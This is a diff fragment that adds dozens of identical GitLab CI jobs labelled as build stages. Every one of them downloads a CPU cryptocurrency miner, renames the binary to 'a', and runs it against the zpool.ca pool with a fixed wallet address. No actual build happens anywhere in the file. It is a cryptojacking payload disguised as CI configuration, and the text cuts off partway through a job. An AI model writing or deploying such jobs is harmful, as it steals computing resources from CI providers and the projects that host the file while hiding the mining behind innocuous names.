+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_t1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_u1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_v1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_w1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_x1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_y1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_z1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_1a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_2a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_3a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+
+build_4a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_5a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_6a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_7a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_8a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_9a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_10a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_11a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_12a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_13a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_14a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_15a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_16a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_17a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_18a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_19a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_20a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_21a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_22a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_23a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_24a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_25a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_26a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a11:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a12:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a13:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a14:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a15:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a16:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a17:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a18:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a19:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a20:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a21:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a22:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a23:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_2724:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a25:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a26:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a27:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a28:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a29:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a30:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a31:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a32:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a33:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a34:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a35:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a36:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a37:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a38:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a39:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a40:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a41:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a42:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a43:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a44:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a45:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+build_ga:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gb:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gc:
+  stage: build
+  script:
